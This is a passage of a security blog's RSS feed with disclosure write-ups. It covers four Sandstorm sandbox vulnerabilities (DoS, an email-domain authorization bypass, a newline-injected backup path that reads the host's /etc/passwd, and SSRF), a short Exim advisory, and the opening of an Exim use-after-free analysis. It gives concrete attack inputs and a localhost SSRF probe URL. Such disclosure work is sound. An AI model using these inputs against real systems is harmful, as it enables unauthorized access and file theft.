&lt;p&gt;ÈÄôÊòØÁ∂ìÂÖ∏ÁöÑ SSRFÔºàServer-Side Request ForgeryÔºâÂïèÈ°åÔºåÂú® Sandstorm ÂÆâË£ù App ÊµÅÁ®ãÊ≤íÊúâÈôêÂà∂ÂÆâË£ù‰æÜÊ∫êÔºåÊîªÊìäËÄÖÊèê‰æõ‰∏ÄÂÄãÂÆâË£ù URL Â∞±ËÉΩËÆì‰º∫ÊúçÂô®Â≠òÂèñË©≤‰ΩçÁΩÆ„ÄÇË©≤ÂïèÈ°åÁôºÁîüÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://[target]/install/xxxChangeItEveryTimexxx?url=http://127.0.0.1:22/&lt;/code&gt;ÔºåÈÄôÂÄãÁØÑ‰æãÈÄ£ÁµêÂæó‰ª•Á¢∫Ë™ç‰º∫ÊúçÂô®ÁöÑ 22 port ÊòØÂê¶ÈñãÂïü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180126/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;center&gt;ÔºàParse ErrorÔºå‰ª£Ë°®‰º∫ÊúçÂô® 22 port ÈñãÂïüÔºâ&lt;/center&gt;

&lt;h2 id=&quot;ÂæåÁ∫å&quot;&gt;ÂæåÁ∫å&lt;/h2&gt;

&lt;p&gt;Âú®Êèê‰∫§Âº±ÈªûÂæåÔºåSandstorm ÂÆòÊñπÈùûÂ∏∏ËøÖÈÄü‰øÆÊ≠£‰∫ÜÂº±ÈªûÔºå‰∏¶‰∏îÁôºË°®‰∫Ü‰∏ÄÁØáÊñáÁ´†Ôºö
&lt;a href=&quot;https://sandstorm.io/news/2017-03-02-security-review&quot;&gt;https://sandstorm.io/news/2017-03-02-security-review&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÈÄôÊ¨°Êª≤ÈÄèÁ∂ìÈ©ó‰∏≠ÔºåÊàëÂÄëË™çÁÇ∫ Sandstorm ÊòØ‰∏ÄÊ¨æÂÆâÂÖ®„ÄÅÊúâÂá∫Ëâ≤Èò≤Á¶¶Ê©üÂà∂ÁöÑÂπ≥Âè∞„ÄÇ‰∏ªË¶ÅÂéüÂõ†ÂèñÊ±∫ÊñºÂÆÉÁöÑ‰∏ÄÂÄãÊ†∏ÂøÉË®≠Ë®àÁêÜÂøµÔºöÂ∞±ÊòØÂÅáË®≠‰ΩøÁî®ËÄÖÂÆâË£ùÁöÑ App ÈÉΩÊòØÊÉ°ÊÑèÁöÑ„ÄÇ‰ª•ÈÄôÊ®£ÁöÑÂâçÊèêÂá∫ÁôºÂéª‰øùË≠∑Ê†∏ÂøÉÁ≥ªÁµ±ÁöÑÂÆâÂÖ®ÔºåÂª∫Á´ãËµ∑‰æÜÁöÑÈò≤Á¶¶Ê©üÂà∂Ëá™ÁÑ∂ÊòØÂÖ®Èù¢‰∏îÂÆåÂñÑÁöÑ„ÄÇÈô§‰∫Ü‰º∫ÊúçÂô®Êú¨Ë∫´ÁöÑ‰øùË≠∑Ôºå‰∏Ä‰∫õÂ∏∏Ë¶ãÁöÑÂÆ¢Êà∂Á´ØÊîªÊìäÔºà‰æãÂ¶ÇÔºöXSS„ÄÅCSRFÔºâ‰πüÈÄèÈÅé Sandstorm ÁâπÊÆäÁöÑÈö®Ê©ü hostname Á≠âÊ©üÂà∂‰øùË≠∑ÁöÑÂæàÂ•Ω„ÄÇÂõ†Ê≠§ÊîªÊìäËÄÖÂæàÈõ£Âæû App Êú¨Ë∫´ÂéªÁ†¥Â£û‰º∫ÊúçÂô®Ôºå‰πüÂæàÈõ£ÈÄèÈÅéÊîªÊìäÂÆ¢Êà∂Á´ØÂéªÊèêÂçá‰ΩøÁî®ËÄÖÁöÑÊ¨äÈôê„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂÑòÁÆ°ÊòØÂ¶ÇÊ≠§ÂÑ™ÁßÄÁöÑÂπ≥Âè∞Ôºå‰ªçËàäÊúÉÂõ†‰∏Ä‰∫õÂ∞èÂú∞ÊñπÁñèÂøΩÂ∞éËá¥ÊîªÊìäËÄÖÊúâÊ©üÂèØ‰πò„ÄÇÈÄôÊ¨°ÁôºÁèæÂº±ÈªûÁöÑÂú∞ÊñπÂ§öÂçäÂú®Êñº library ÁöÑË™§Áî®ÂíåÊñ∞ÂäüËÉΩÁöÑÊí∞ÂØ´Ê≤íÊúâËÄÉÊÖÆÂà∞ËàäÊúâÈò≤Á¶¶Êû∂Êßã„ÄÇÈÄôÂú®ÂÖ∂‰ªñÂ∞àÊ°à‰πüÊòØÂ∏∏Ë¶ãÁöÑÂïèÈ°åÔºåËóâÊ©ü‰πüÊèêÈÜíÈñãÁôºËÄÖÂú®ÈñãÁôºÊñ∞ÂäüËÉΩÊôÇÊáâÂÅöÂÖ®Èù¢ÁöÑÂÆâÂÖ®Ê™¢Ë¶ñÔºå‰ª•ÈÅøÂÖçÈò≤Á¶¶ËêΩÂ∑ÆÊâÄÂ∞éËá¥ÁöÑÂº±Èªû„ÄÇ&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/</link>
                <guid>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200</guid>
                <pubDate>Fri, 26 Jan 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Sandstorm Security Review</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;‰∏ÄÊ¨°Âú® Sandstorm Ë∑≥ËÑ´Ê≤ôÁÆ±ÁöÑÊª≤ÈÄèÁ∂ìÈ©ó&lt;/a&gt; (‰∏≠ÊñáÁâàÊú¨)&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;In early 2017, we had a pentesting target protected with &lt;a href=&quot;https://sandstorm.io/&quot;&gt;Sandstorm&lt;/a&gt;. Sandstorm is a web-based platform which allows users to install their web apps, such as WordPress, GitLab, etc. The main feature of Sandstorm is that it containerizes every app in its own sandbox. Therefore, even though we had found several vulnerabilities of the apps, we still could not put a threat to the server.&lt;/p&gt;

&lt;p&gt;In order to leverage the vulnerabilities, we put part of efforts into review of Sandstorm‚Äôs source codes, and tried to escape the sandbox to impact the whole server. Finally, we found a number of uncommon and interesting vulnerabilities, and received CVE IDs as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-6198 (Denial of Service)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6199 (Bypassing Authorization Schema)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6200 (Insecure Direct Object References)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6201 (Server-Side Request Forgery)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;exploitation-details&quot;&gt;Exploitation Details&lt;/h2&gt;

&lt;h3 id=&quot;cve-2017-6198&quot;&gt;CVE-2017-6198&lt;/h3&gt;

&lt;p&gt;This is a DoS created by system resource exhaustion. The root cause is that Sandstorm does not have a comprehensive policy to limit the amount of resource used by every apps run on it. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/sandstorm/supervisor.c++&lt;/code&gt; only the maximum number of files opened by each process was limited. See the codes below:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SupervisorMain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setResourceLimits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rlimit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;KJ_SYSCALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_NOFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Since supervisor does not restrict the amount of subprocesses and storage usage, attackers can raise a resource exhaustion attack to crash the server by simply uploading a malicious app which keeps calling fork() (aka the ‚Äúfork bomb‚Äù) or consumes huge storage space.&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6199&quot;&gt;CVE-2017-6199&lt;/h3&gt;

&lt;p&gt;Usually Sandstorm will designate unique permissions to the specific members of a certain organization, and the default membership validation method is to check user‚Äôs email address and see whether the string after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt; exists in their white list. See the codes below:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;emailDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Therefore, when an attacker fills in an email like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; and the system will automatically consider the attacker a member of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; organization.&lt;/p&gt;

&lt;p&gt;Another key factor that contributes to the successful attack lies in one of the features when users log on Sandstorm. Users does not need to set up passwords for Sandstorm. Each time when the users need to log onto the service, they only need to fill in their email address, and they‚Äôll receive a set of random unique password for login. The reason why the example above works is because the system treats &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; as a user from aaa.bbb domain, and the random password will be sent to the two email addresses, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ccc@aaa.bbb&lt;/code&gt; As long as one can receive the password, they can log in to use the service.&lt;/p&gt;

&lt;p&gt;Below is a quick demonstration:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;On Sandstorm, restrict access to users from domain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; only.
&lt;img src=&quot;/assets/img/blog/20180126/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;On login page, fill in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; for the email field.
(Note: at the front end, the email field is checked with HTML5 validation, but it is not further checked for validity at the back end)
&lt;img src=&quot;/assets/img/blog/20180126/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Retrieve random password in demo@devco.re mailbox.
&lt;img src=&quot;/assets/img/blog/20180126/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Login successful. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; is considered as a user and member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; organization!
&lt;img src=&quot;/assets/img/blog/20180126/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In our pentesting, the target website allowed users from validated domains to install their own apps. Therefore, through this bypass exploit, further attacks could be accomplished by combining other vulnerabilities described in this blog post (CVE-2017-6198, CVE-2017-6200, CVE-2017-6201).&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6200&quot;&gt;CVE-2017-6200&lt;/h3&gt;

&lt;p&gt;This is an interesting vulnerability. Totally two little validation flaws were exploited to initiate this attack!
On Sandstorm, owners of each Grain (Sandstorm container, in short, an app sandbox) can download their backup data for the app. But because of the two vulnerabilities in the packing process, an attacker can pack the files under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; directories located on the server outside the sandbox. The security issues were as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;The packing process has hid &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and other sensitive directories, but did not hide &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc.host&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run.host&lt;/code&gt; these two directories. These directories are the aliases for the directories &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; on the server respectively, which are relatively newer features.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The system will pack the legitimate files, have them sorted out, and create zip packages through the standard input interface. The separation between files are determined by line-breaks (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt;). As a result, when a line-break string appears in the file name, illegal path file names can be injected and packed with zip. Although the app checks whether there is a line-break in the file name, but the directory name was not checked.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;By using these two vulnerabilities together, the attacker simply has to create a directory in the sandbox &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt; , then backup files containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; on the server can be retrieved through backup downloading function.&lt;/p&gt;

&lt;p&gt;Screenshot of a real-world scenario:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;First, create a new directory in Grain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;, and use the Grain Backup function to download the backup file.
&lt;img src=&quot;/assets/img/blog/20180126/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;After unzipping the backup file, from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etc.host&lt;/code&gt; we‚Äôll see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; of the server outside the sandbox.
&lt;img src=&quot;/assets/img/blog/20180126/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;cve-2017-6201&quot;&gt;CVE-2017-6201&lt;/h3&gt;

&lt;p&gt;This is a classic SSRF (Server-Side Request Forgery) issue. Sandstorm allow installation of apps from arbitrary sources, and an attacker can simply let the server access a certain location by providing an installation URL. The problem was identified on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://[target]/install/xxxChangeItEveryTimexxx?url=http://127.0.0.1:22/&lt;/code&gt; This sample link confirms whether the server‚Äôs port 22 is open.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180126/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;center&gt;(Parse Error, which implies server‚Äôs port 22 is open)&lt;/center&gt;

&lt;h2 id=&quot;follow-up-updates&quot;&gt;Follow-up Updates&lt;/h2&gt;

&lt;p&gt;After we reported the vulnerabilities, Sandstorm fixed it immediately and then published an article:
&lt;a href=&quot;https://sandstorm.io/news/2017-03-02-security-review&quot;&gt;https://sandstorm.io/news/2017-03-02-security-review&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Through this pentesting experience, we consider Sandstorm a safe platform with outstanding security mechanisms. This is mainly attributed to its fundamental design rationale: to assume that every app installed is malicious. With this vigilant assumption, Sandstorm‚Äôs defence mechanisms for the core system become comprehensive and watertight. Apart from the server-side protection, some common client-side attacks (such as XSS, CSRF) are handled properly by Sandstorm‚Äôs unique countermeasures, such as host name randomization. That is, it is very difficult for attackers to sabotage the server by simply manipulating the apps, and so does privilege escalation through attacking at the client-side.&lt;/p&gt;

&lt;p&gt;Nevertheless, such an impressive platform still had some minor mistakes which led to security issues. Most of the vulnerabilities found this time are improper usages of libraries or negligence of existing defence architecture while introducing new features. These types of vulnerability are also common in our other projects. We would like to take the opportunity to remind developers, always present a comprehensive security review especially when developing new features to avoid vulnerabilities caused by the gaps between defence mechanisms.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/</link>
                <guid>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en</guid>
                <pubDate>Fri, 26 Jan 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim RCE Ë≥áÂÆâÈÄöÂ†± (CVE-2017-16943)</title>
                <description>&lt;h2 id=&quot;ÂÖßÂÆπ&quot;&gt;ÂÖßÂÆπ&lt;/h2&gt;

&lt;p&gt;2017/11/23 ÊàëÂÄëÁôºÁèæ Unix ÁöÑÈñãÊ∫êËªüÈ´î EXIM Âê´Êúâ Use-After-Free Âº±ÈªûÔºàCVE-2017-16943Ôºâ‰ª•Âèä Denial-of-Service Âº±ÈªûÔºàCVE-2017-16944ÔºâÔºå&lt;strong&gt;Áï∂ EXIM ÁâàÊú¨ÊòØ 4.88 Êàñ 4.89 ‰∏¶‰∏îÊúâÈñãÂïü chunking ÈÅ∏È†ÖÔºàBDAT Êåá‰ª§ÔºâÊôÇ&lt;/strong&gt;ÔºåÊîªÊìäËÄÖÂèØÂÇ≥ÈÄÅÁâπÂÆöÂ≠ó‰∏≤Áµ¶ EXIM Ëß∏ÁôºÂº±ÈªûÔºåÂèØËÉΩÈÄ†ÊàêÈÉµ‰ª∂‰º∫ÊúçÂô®Ë¢´&lt;strong&gt;ÈÅ†Á´ØÊîªÊìäËÄÖÂÖ•‰æµ&lt;/strong&gt;ÊàñÊòØ&lt;strong&gt;ÈÉµ‰ª∂‰º∫ÊúçÂô®ÁÑ°Ê≥ïÁπºÁ∫åÊèê‰æõÊúçÂãô&lt;/strong&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê†πÊìö E-Soft Inc. Âú® 11 ÊúàÊâÄÂÅöÁöÑË™øÊü•ÔºåÁ¥ÑÊúâ 57Ëê¨Âè∞Ôºà56%ÔºâÁöÑÈÉµ‰ª∂‰º∫ÊúçÂô®‰ΩøÁî® EXIM ËªüÈ´î„ÄÇÂª∫Ë≠∞ EXIM ÁöÑ‰ΩøÁî®ËÄÖÊ™¢Êü•ÁâàÊú¨ÊòØÂê¶ÁÇ∫ 4.88 Êàñ 4.89ÔºåËã•ÊòØÔºåÂâáÈúÄ‰øÆÊîπ EXIM ÁöÑË®≠ÂÆöÔºåÂ∞á chunking ÈÅ∏È†Ö&lt;strong&gt;ÈóúÈñâ&lt;/strong&gt;ÔºàÂú® config Ë£°Â∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chunking_advertise_hosts&lt;/code&gt; ÈÅ∏È†ÖÁïôÁ©∫ÔºâÔºåÊàñÊòØ&lt;strong&gt;Êõ¥Êñ∞Ëá≥ 4.89.1 Áâà&lt;/strong&gt;Ôºå‰ª•ÈÅøÂÖçÈÅ≠ÂèóÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Á¥∞ÁØÄ&quot;&gt;Á¥∞ÁØÄ&lt;/h2&gt;

&lt;p&gt;Ë©≥Á¥∞ÁöÑÊäÄË°ìÁ¥∞ÁØÄË´ãÂèÉÈñ±ÊàëÂÄëÁöÑ AdvisoryÔºö
&lt;a href=&quot;https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/&quot;&gt;https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/&lt;/a&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943/</link>
                <guid>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943</guid>
                <pubDate>Mon, 11 Dec 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA</title>
                <description>&lt;p&gt;On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;about-exim&quot;&gt;About Exim&lt;/h2&gt;
&lt;p&gt;Exim is a message transfer agent (MTA) used on Unix systems. Exim is an open source project and is the default MTA on Debian GNU/Linux systems. According to our survey, there are about 600k SMTP servers running exim on 21st November, 2017 (data collected from scans.io). Also, a &lt;a href=&quot;http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html&quot;&gt;mail server survey&lt;/a&gt; by E-Soft Inc. shows over half of the mail servers identified are running exim.&lt;/p&gt;

&lt;h2 id=&quot;affected&quot;&gt;Affected&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Exim version 4.88 &amp;amp; 4.89 with chunking option enabled.&lt;/li&gt;
  &lt;li&gt;According to our survey, about 150k servers affected on 21st November, 2017 (data collected from scans.io).&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details&lt;/h2&gt;
&lt;p&gt;Through our research, the following vulnerabilies were discovered in Exim. Both vulnerabilies involve in BDAT command. BDAT is an extension in SMTP protocol, which is used to transfer large and binary data. A BDAT command is like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BDAT 1024&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BDAT 1024 LAST&lt;/code&gt;. With the SIZE and LAST declared, mail servers do not need to scan for the end dot anymore. This command was introduced to exim in version 4.88, and also brought some bugs.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Use-after-free in receive_msg leads to RCE (CVE-2017-16943)&lt;/li&gt;
  &lt;li&gt;Incorrect BDAT data handling leads to DoS  (CVE-2017-16944)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;use-after-free-in-receive_msg-leads-to-rce&quot;&gt;Use-after-free in receive_msg leads to RCE&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h3&gt;
&lt;p&gt;To explain this bug, we need to start with the memory management of exim. There is a series of functions starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_&lt;/code&gt; such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset&lt;/code&gt;. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:
&lt;img src=&quot;/assets/img/blog/20171211/1.png&quot; alt=&quot;architecture of storeblock&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Initially, exim allocates a big storeblock (default 0x2000) and then cut it into &lt;strong&gt;stores&lt;/strong&gt; when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; point to it. Exim maintains three &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_pool&lt;/code&gt;, that is, there are three chains like the illustration above and every global variables are actually arrays.
This vulnerability is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt; where exim reads headers: 
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1817&quot;&gt;receive.c: 1817 receive_msg&lt;/a&gt;&lt;/p&gt;
